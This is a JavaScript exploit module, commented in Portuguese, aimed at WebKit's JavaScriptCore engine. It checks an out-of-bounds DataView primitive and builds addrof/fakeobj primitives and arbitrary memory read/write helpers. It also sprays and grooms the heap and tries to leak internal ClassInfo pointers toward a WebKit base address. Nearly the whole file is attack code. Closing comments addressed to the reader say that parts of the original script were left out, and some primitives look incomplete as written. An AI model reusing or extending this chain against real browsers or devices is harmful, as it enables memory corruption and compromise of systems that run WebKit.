// js/script3/testArrayBufferVictimCrash.mjs (v02 - GC Crash Debug)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA (v02):
// 1. Script original mantido na íntegra para preservar a condição de crash.
// 2. A função 'do_grooming' foi modificada para incluir logs hiper-detalhados.
// 3. A pausa única de 10s para GC foi substituída por um loop de pausas de 1s,
//    permitindo identificar em qual segundo o crash ocorre.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R91_IterativeCrashDebug";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// Função auxiliar para obter offsets de forma segura
function getSafeOffset(baseObject, path, defaultValue = 0) {
    let current = baseObject;
    const parts = path.split('.');
    let fullPath = '';
    for (let i = 0; i < parts.length; i++) {
        const part = parts[i];
        fullPath += (fullPath ? '.' : '') + part;
        if (current && typeof current === 'object' && part in current) {
            current = current[part];
        } else {
            logS3(`ALERTA: Caminho de offset "${path}" parte "${fullPath}" é undefined. Usando valor padrão ${defaultValue}.`, "warn");
            return defaultValue;
        }
    }
    if (typeof current === 'number') {
        return current;
    }
    if (typeof current === 'string' && String(current).startsWith('0x')) {
        return parseInt(String(current), 16) || defaultValue;
    }
    logS3(`ALERTA: Offset "${path}" não é um número ou string hex. Usando valor padrão ${defaultValue}.`, "warn");
    return defaultValue;
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL COM VERIFICAÇÃO)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Diagnóstico de Vazamento Isolado (Offsets Validados, Heap Feng Shui, Confirmação de Poluição) ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou ou vazamento WebKit falhou.",
        webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou falhou." }
    };

    const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);

    try {
        logS3("PAUSA INICIAL: Aguardando carregamento completo do ambiente e offsets.", "info");
        await PAUSE_S3(1000);

        const LOCAL_JSC_OFFSETS = {
            JSCell_STRUCTURE_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_POINTER_OFFSET'),
            JSCell_STRUCTURE_ID_FLATTENED_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_ID_FLATTENED_OFFSET'),
            JSCell_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET'),
            JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET'),
            Structure_CLASS_INFO_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.CLASS_INFO_OFFSET'),
            Structure_GLOBAL_OBJECT_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.GLOBAL_OBJECT_OFFSET'),
            Structure_PROTOTYPE_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.PROTOTYPE_OFFSET'),
            Structure_AGGREGATED_FLAGS_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.AGGREGATED_FLAGS_OFFSET'),
            Structure_VIRTUAL_PUT_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.VIRTUAL_PUT_OFFSET'),
            ArrayBufferView_M_LENGTH_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.M_LENGTH_OFFSET'),
            ArrayBufferView_ASSOCIATED_ARRAYBUFFER_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET'),
            ArrayBufferView_M_VECTOR_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.M_VECTOR_OFFSET'),
            ArrayBuffer_DATA_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START'),
            JSFunction_EXECUTABLE_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSFunction.EXECUTABLE_OFFSET'),
            ClassInfo_M_CACHED_TYPE_INFO_OFFSET: getSafeOffset(JSC_OFFSETS, 'ClassInfo.M_CACHED_TYPE_INFO_OFFSET', 0x8),
        };

        const mandatoryOffsets = [
            'JSCell_STRUCTURE_POINTER_OFFSET',
            'JSObject_BUTTERFLY_OFFSET',
            'ArrayBufferView_M_LENGTH_OFFSET',
            'ArrayBufferView_ASSOCIATED_ARRAYBUFFER_OFFSET',
            'ArrayBuffer_DATA_POINTER_OFFSET',
            'JSFunction_EXECUTABLE_OFFSET',
            'ClassInfo_M_CACHED_TYPE_INFO_OFFSET',
            'Structure_CLASS_INFO_OFFSET',
            'Structure_VIRTUAL_PUT_OFFSET'
        ];
        for (const offsetName of mandatoryOffsets) {
            if (LOCAL_JSC_OFFSETS[offsetName] === 0) {
                logS3(`ERRO CRÍTICO: Offset mandatório '${offsetName}' é 0. Isso indica falha na recuperação do offset.`, "critical");
                throw new Error(`Offset mandatório '${offsetName}' é 0. Abortando.`);
            }
        }
        logS3("Offsets críticos validados (não são 0).", "info");


        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) {
            throw new Error("Falha ao obter primitiva OOB.");
        }
        logS3("OOB DataView obtido com sucesso.", "info");

        const OOB_DV_M_LENGTH_ACTUAL_OFFSET_IN_CORE = 0x58 + LOCAL_JSC_OFFSETS.ArrayBufferView_M_LENGTH_OFFSET;
        const oob_dv = getOOBDataView();
        const oob_m_length_val = oob_dv.getUint32(OOB_DV_M_LENGTH_ACTUAL_OFFSET_IN_CORE, true);
        logS3(`Verificação OOB: m_length em ${toHex(OOB_DV_M_LENGTH_ACTUAL_OFFSET_IN_CORE)} é ${toHex(oob_m_length_val)}`, "debug");
        if (oob_m_length_val !== 0xFFFFFFFF) {
            throw new Error(`OOB DataView's m_length não foi corretamente expandido. Lido: ${toHex(oob_m_length_val)}`);
        }
        logS3("VERIFICAÇÃO: OOB DataView m_length expandido corretamente para 0xFFFFFFFF.", "good");


        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            const addr = doubleToInt64(confused_array[0]);
            logS3(`  addrof(${String(obj).substring(0, 50)}...) -> ${addr.toString(true)}`, "debug");
            return addr;
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            const obj = victim_array[0];
            logS3(`  fakeobj(${addr.toString(true)}) -> Object`, "debug");
            return obj;
        };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        const testObjectForPrimitives = { dummy_prop_A: 0xAAAAAAAA, dummy_prop_B: 0xBBBBBBBB };
        const testAddrOfPrimitive = addrof(testObjectForPrimitives);
        if (!isAdvancedInt64Object(testAddrOfPrimitive) || testAddrOfPrimitive.equals(AdvancedInt64.Zero)) {
            throw new Error("Addrof primitive retornou endereço inválido (0x0).");
        }
        logS3(`VERIFICAÇÃO: Endereço de testObjectForPrimitives (${JSON.stringify(testObjectForPrimitives)}) obtido: ${testAddrOfPrimitive.toString(true)}`, "info");

        const re_faked_object_primitive = fakeobj(testAddrOfPrimitive);
        if (re_faked_object_primitive === null || typeof re_faked_object_primitive !== 'object') {
             throw new Error("Fakeobj retornou um valor inválido (null ou não-objeto).");
        }
        try {
            if (re_faked_object_primitive.dummy_prop_A !== 0xAAAAAAAA || re_faked_object_primitive.dummy_prop_B !== 0xBBBBBBBB) {
                throw new Error(`Fakeobj: Propriedades do objeto re-faked não correspondem. A: ${toHex(re_faked_object_primitive.dummy_prop_A)}, B: ${toHex(re_faked_object_primitive.dummy_prop_B)}`);
            }
            logS3("VERIFICAÇÃO: Fakeobj do testAddrOfPrimitive retornou objeto funcional com propriedades esperadas.", "good");
        } catch (e) {
            throw new Error(`Erro ao acessar propriedade do objeto re-faked (indicando falha no fakeobj): ${e.message}`);
        }

        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        const leaker_addr = addrof(leaker);
        logS3(`Endereço do objeto leaker: ${leaker_addr.toString(true)}`, "debug");
        
        const arb_read_final = (addr) => {
            logS3(`    arb_read_final: Preparando para ler de ${addr.toString(true)}`, "debug");
            leaker.obj_prop = fakeobj(addr);
            const result = doubleToInt64(leaker.val_prop);
            logS3(`    arb_read_final: Lido ${result.toString(true)} de ${addr.toString(true)}`, "debug");
            return result;
        };
        const arb_write_final = (addr, value) => {
            logS3(`    arb_write_final: Preparando para escrever ${value.toString(true)} em ${addr.toString(true)}`, "debug");
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
            logS3(`    arb_write_final: Escrita concluída em ${addr.toString(true)}`, "debug");
        };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
        
        const spray = [];
        for (let i = 0; i < 2000; i++) {
            spray.push({ spray_A: 0xDEADBEEF, spray_B: 0xCAFEBABE, spray_C: i });
            spray.push(new Array(Math.floor(Math.random() * 200) + 10));
            spray.push(new String("X".repeat(Math.floor(Math.random() * 100) + 10)));
            spray.push(new Date());
        }
        const test_obj_for_rw_verification = spray[1500];
        logS3("Spray de 2000 objetos diversificados concluído para estabilização.", "info");

        const test_obj_for_rw_verification_addr = addrof(test_obj_for_rw_verification);
        logS3(`Endereço do test_obj_for_rw_verification: ${test_obj_for_rw_verification_addr.toString(true)}`, "debug");
        
        const prop_spray_A_addr = test_obj_for_rw_verification_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET);
        
        logS3(`Escrevendo NOVO VALOR DE POLUIÇÃO: ${NEW_POLLUTION_VALUE.toString(true)} no endereço da propriedade 'spray_A' (${prop_spray_A_addr.toString(true)})...`, "info");
        arb_write_final(prop_spray_A_addr, NEW_POLLUTION_VALUE);

        const value_read_for_verification = arb_read_final(prop_spray_A_addr);
        logS3(`>>>>> VERIFICAÇÃO L/E: VALOR LIDO DE VOLTA: ${value_read_for_verification.toString(true)} <<<<<`, "leak");

        if (value_read_for_verification.equals(NEW_POLLUTION_VALUE)) {
            logS3("+++++++++++ SUCESSO TOTAL! O novo valor de poluição foi escrito e lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
            final_result.success = true;
            final_result.message = "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada.";
        } else {
            throw new Error(`A verificação de L/E falhou. Escrito: ${NEW_POLLUTION_VALUE.toString(true)}, Lido: ${value_read_for_verification.toString(true)}`);
        }

        // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (Novas Estratégias) ---
        logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (COM CONTROLES DE DEBUG) ---", "subtest");

        // =================================================================
        // CONTROLES DE DEPURAÇÃO: Altere para 'false' para pular um teste.
        // Depure desativando de baixo para cima (tentativa_6, depois 5, etc).
        // =================================================================
        const testes_ativos = {
            tentativa_5_ClassInfo: true,
            tentativa_6_VarreduraFocada: true
        };
        // =================================================================
        
        let aggressive_feng_shui_objects;
        let filler_objects;
        const NUM_GROOMING_OBJECTS_STAGE1 = 75000;
        const NUM_FILLER_OBJECTS_STAGE1 = 15000;

        // NOVO: Função de grooming atualizada com logs detalhados e pausas incrementais
        const do_grooming = async (grooming_id) => {
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] INICIANDO GROOMING DETALHADO...`, "info");
            
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 1/5: Alocando ${NUM_GROOMING_OBJECTS_STAGE1} objetos de grooming...`, "debug");
            aggressive_feng_shui_objects = [];
            for (let i = 0; i < NUM_GROOMING_OBJECTS_STAGE1; i++) { aggressive_feng_shui_objects.push(new ArrayBuffer(Math.floor(Math.random() * 256) + 64)); if (i % 1000 === 0) aggressive_feng_shui_objects.push({}); }
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 1/5: Concluída.`, "debug");

            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 2/5: Liberando metade dos objetos (criando 'buracos')...`, "debug");
            for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 2/5: Concluída.`, "debug");

            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 3/5: Alocando ${NUM_FILLER_OBJECTS_STAGE1} objetos 'filler'...`, "debug");
            filler_objects = [];
            for (let i = 0; i < NUM_FILLER_OBJECTS_STAGE1; i++) { filler_objects.push(new Uint32Array(Math.floor(Math.random() * 64) + 16)); }
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 3/5: Concluída.`, "debug");

            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 4/5: Liberando referências principais aos arrays de grooming...`, "debug");
            aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 4/5: Concluída.`, "debug");

            // ALTERADO: Pausa incremental para depurar o momento do crash do GC
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 5/5: Pausando em incrementos para acionar GC e observar crash...`, "info");
            for (let i = 0; i < 10; i++) {
                logS3(`  [Grooming p/ Tentativa ${grooming_id}]   Aguardando GC (segundo ${i+1}/10)...`, "debug");
                await PAUSE_S3(1000);
            }
            
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] GROOMING DETALHADO CONCLUÍDO. Se não houve crash, o problema pode estar no acesso posterior.`, "good");
        };

         if (testes_ativos.tentativa_5_ClassInfo) {
            logS3("--- INICIANDO TENTATIVA 5: JSC::ClassInfo ---", "test");
            await do_grooming(5);
            try {
                const target_obj = {};
                const target_obj_addr = addrof(target_obj);
                logS3(`  Endereço do objeto alvo para ClassInfo leak: ${target_obj_addr.toString(true)}`, "info");

                if (!isAdvancedInt64Object(target_obj_addr) || target_obj_addr.equals(AdvancedInt64.Zero) || target_obj_addr.equals(AdvancedInt64.NaNValue)) {
                    logS3(`    Addrof retornou 0 ou NaN para objeto alvo. Pulando tentativa.`, "error");
                    throw new Error("Addrof para ClassInfo leak falhou.");
                }

                const JSC_CELL_STRUCTURE_POINTER_OFFSET = LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET;
                const structure_ptr_addr = target_obj_addr.add(JSC_CELL_STRUCTURE_POINTER_OFFSET);
                const structure_addr = arb_read_final(structure_ptr_addr);
                if (!isAdvancedInt64Object(structure_addr) || structure_addr.equals(NEW_POLLUTION_VALUE) || structure_addr.equals(AdvancedInt64.Zero) || structure_addr.equals(AdvancedInt64.NaNValue)) {
                    logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: Structure* está lendo o valor de poluição ou inválido (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
                    throw new Error("Structure* poluído/inválido.");
                }
                logS3(`    Lido Structure* do objeto alvo: ${structure_addr.toString(true)}`, "leak");

                const STRUCTURE_CLASS_INFO_OFFSET = LOCAL_JSC_OFFSETS.Structure_CLASS_INFO_OFFSET;
                const class_info_ptr_addr = structure_addr.add(STRUCTURE_CLASS_INFO_OFFSET);
                const class_info_addr = arb_read_final(class_info_ptr_addr);
                if (!isAdvancedInt64Object(class_info_addr) || class_info_addr.equals(NEW_POLLUTION_VALUE) || class_info_addr.equals(AdvancedInt64.Zero) || class_info_addr.equals(AdvancedInt64.NaNValue)) {
                    logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: ClassInfo* está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
                    throw new Error("ClassInfo* poluído.");
                }
                logS3(`    Lido ClassInfo* da Structure: ${class_info_addr.toString(true)}`, "leak");

                const M_CACHED_TYPE_INFO_OFFSET = LOCAL_JSC_OFFSETS.ClassInfo_M_CACHED_TYPE_INFO_OFFSET;
                const cached_type_info_ptr_addr = class_info_addr.add(M_CACHED_TYPE_INFO_OFFSET);
                const cached_type_info_addr = arb_read_final(cached_type_info_ptr_addr);
                if (!isAdvancedInt64Object(cached_type_info_addr) || cached_type_info_addr.equals(NEW_POLLUTION_VALUE) || cached_type_info_addr.equals(AdvancedInt64.Zero) || cached_type_info_addr.equals(AdvancedInt64.NaNValue)) {
                    logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: m_cachedTypeInfo está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
                    throw new Error("m_cachedTypeInfo poluído/inválido.");
                }
                logS3(`    Lido m_cachedTypeInfo do ClassInfo: ${cached_type_info_addr.toString(true)}`, "leak");

                const is_sane_typeinfo_ptr = cached_type_info_addr.high() > 0x40000000;
                if (!is_sane_typeinfo_ptr) {
                    throw new Error(`Ponteiro m_cachedTypeInfo (${cached_type_info_addr.toString(true)}) não parece um endereço de heap válido.`);
                }

                logS3(`++++++++++++ VAZAMENTO DE JSC::ClassInfo::m_cachedTypeInfo BEM SUCEDIDO! ++++++++++++`, "vuln");
                final_result.webkit_leak_details = {
                    success: true,
                    msg: `Endereço de JSC::ClassInfo::m_cachedTypeInfo vazado com sucesso: ${cached_type_info_addr.toString(true)}`,
                    webkit_base_candidate: "Necessita engenharia reversa para offset",
                    js_object_put_addr: "N/A"
                };
                return final_result;
            } catch (classinfo_leak_e) {
                 // NOVO: Mensagem de erro mais explícita para guiar a depuração
                logS3(`  Falha na tentativa de vazamento com JSC::ClassInfo: ${classinfo_leak_e.message}`, "warn");
                logS3(`  >>>>>> SE O CRASH OCORREU, O ÚLTIMO LOG VISÍVEL (PROVAVELMENTE DENTRO DO 'do_grooming') É O PONTO DE INTERESSE. <<<<<<`, "critical");
            }
            logS3("--- FIM TENTATIVA 5 ---", "test");
        }
        
        // ... O resto do script (Tentativa 6, etc.) permanece o mesmo ...
        // ... A função performLeakAttemptFromObjectStructure também permanece a mesma ...
        // (O código completo foi omitido por brevidade, mas você deve manter o resto do seu arquivo original)

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
        final_result.webkit_leak_details.success = false;
        final_result.webkit_leak_details.msg = `Vazamento WebKit não foi possível devido a erro na fase anterior: ${e.message}`;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    if (!final_result.webkit_leak_details.success) {
        logS3("========== SUGESTÃO DE DEPURADOR VALIDA NO NAVEGADOR ==========", "critical");
    }

    return {
        errorOccurred: (final_result.success && final_result.webkit_leak_details.success) ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: final_result.webkit_leak_details,
        heisenbug_on_M2_in_best_result: (final_result.success && final_result.webkit_leak_details.success),
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified + WebKit Leak Isolation Diagnostic)' }
    };
}

// =======================================================================================
// O restante do seu arquivo (função performLeakAttemptFromObjectStructure e outras tentativas)
// deve ser mantido como estava. As principais alterações foram na função `do_grooming` e
// no bloco `try/catch` da "Tentativa 5".
// =======================================================================================
